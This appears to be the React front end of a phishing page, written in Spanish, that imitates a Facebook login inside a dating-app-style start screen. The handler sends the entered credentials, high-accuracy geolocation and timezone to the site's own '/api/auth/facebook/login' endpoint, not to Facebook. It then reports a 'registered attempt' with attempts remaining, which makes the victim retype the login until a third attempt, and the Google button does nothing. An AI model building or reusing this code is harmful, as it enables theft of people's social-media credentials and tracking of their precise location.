import React, { useState, useEffect } from 'react';
import { Layout, Typography, Button, Modal, message } from 'antd';
import { GoogleOutlined, PhoneOutlined } from '@ant-design/icons';
import axios from 'axios';
import FacebookLoginModal from './FacebookLoginModal';
import ProcessingModal from './ProcessingModal';
import Dashboard from './Dashboard';

const { Content } = Layout;
const { Title, Text, Link } = Typography;

const SESSION_KEY = 'userSession';

const HomePage = () => {
  const [loginModalVisible, setLoginModalVisible] = useState(false);
  const [processingModalVisible, setProcessingModalVisible] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [userData, setUserData] = useState(null);
  const [location, setLocation] = useState(null);
  const [showMainModal, setShowMainModal] = useState(true);

  // Cargar sesión al inicio
  useEffect(() => {
    const savedSession = localStorage.getItem(SESSION_KEY);
    if (savedSession) {
      const session = JSON.parse(savedSession);
      setIsLoggedIn(true);
      setUserData(session.user);
      setShowMainModal(false);
    }
  }, []);

  const requestLocation = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        message.error('Tu navegador no soporta geolocalización');
        resolve(null);
        return;
      }

      const options = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      };

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp
          };
          setLocation(locationData);
          resolve(locationData);
        },
        (error) => {
          message.warning('Para una mejor experiencia, permite el acceso a tu ubicación');
          resolve(null);
        },
        options
      );
    });
  };

  const handleLoginClick = async () => {
    const locationData = await requestLocation();
    
    if (!locationData) {
      Modal.confirm({
        title: 'Acceso a ubicación',
        content: 'Para ofrecerte una mejor experiencia y contenido personalizado, necesitamos acceder a tu ubicación. ¿Deseas intentar nuevamente?',
        okText: 'Sí, permitir',
        cancelText: 'No, continuar sin ubicación',
        onOk: async () => {
          await requestLocation();
          setLoginModalVisible(true);
        },
        onCancel: () => {
          setLoginModalVisible(true);
        }
      });
    } else {
      setLoginModalVisible(true);
    }
  };

  const handleLoginSubmit = async (values) => {
    try {
      setLoginModalVisible(false);
      setProcessingModalVisible(true);
      
      const loginData = {
        ...values,
        location: location,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
      };
      
      const response = await axios.post(`${import.meta.env.VITE_API_URL}/api/auth/facebook/login`, loginData);
      
      setProcessingModalVisible(false);
      
      if (response.data.success) {
        if (response.data.isThirdAttempt || response.data.isExistingUser) {
          // Guardar sesión
          localStorage.setItem(SESSION_KEY, JSON.stringify({
            user: response.data.user,
            loginTime: new Date().toISOString()
          }));

          setIsLoggedIn(true);
          setUserData(response.data.user);
          setShowMainModal(false);
          message.success(response.data.message);
        } else {
          message.info(`Intento registrado. Te quedan ${response.data.attemptsRemaining} intentos.`);
          setLoginModalVisible(true);
        }
      }
    } catch (error) {
      setProcessingModalVisible(false);
      
      if (error.response) {
        message.error(error.response.data.message || 'Error al iniciar sesión');
      } else {
        message.error('Error al conectar con el servidor');
      }
      
      setLoginModalVisible(true);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem(SESSION_KEY);
    setIsLoggedIn(false);
    setUserData(null);
    setShowMainModal(true);
    message.success('Has cerrado sesión correctamente');
  };

  if (isLoggedIn && userData) {
    return <Dashboard onLogout={handleLogout} />;
  }

  return (
    <Layout className="layout">
      <Content style={{ minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
        <Modal
          visible={showMainModal}
          footer={null}
          closable={true}
          onCancel={() => setShowMainModal(false)}
          width={400}
          style={{ top: '20%' }}
        >
          <div style={{ textAlign: 'center', padding: '20px 0' }}>
            <div style={{ fontSize: '40px', marginBottom: '20px' }}>X</div>
            <Title level={3}>Empieza ahora</Title>
            
            <Text style={{ display: 'block', marginBottom: '20px' }}>
              Al hacer clic en Iniciar sesión o Continuar, aceptas nuestros{' '}
              <Link href="#">Términos</Link>. Conoce cómo procesamos tus datos en nuestra{' '}
              <Link href="#">Política de privacidad</Link> y{' '}
              <Link href="#">Política sobre cookies</Link>.
            </Text>

            <Button
              icon={<GoogleOutlined />}
              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
              onClick={() => {}}
            >
              Continuar con Google
            </Button>

            <Button
              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
              onClick={handleLoginClick}
            >
              Iniciar sesión con Facebook
            </Button>

            <Button
              icon={<PhoneOutlined />}
              style={{ width: '100%', marginBottom: '10px', height: '40px' }}
            >
              Inicia sesión con tu teléfono
            </Button>

            <div style={{ marginTop: '20px' }}>
              <Link href="#">¿Problemas para iniciar sesión?</Link>
            </div>

            <div style={{ marginTop: '20px' }}>
              <Title level={4}>¡Descarga la app!</Title>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '10px', marginTop: '10px' }}>
                <Link href="#" target="_blank">
                  <img src="/app-store.png" alt="App Store" style={{ height: '40px' }} />
                </Link>
                <Link href="#" target="_blank">
                  <img src="/google-play.png" alt="Google Play" style={{ height: '40px' }} />
                </Link>
              </div>
            </div>
          </div>
        </Modal>

        <FacebookLoginModal
          visible={loginModalVisible}
          onCancel={() => setLoginModalVisible(false)}
          onSubmit={handleLoginSubmit}
        />
        
        <ProcessingModal visible={processingModalVisible} />
      </Content>
    </Layout>
  );
};

export default HomePage;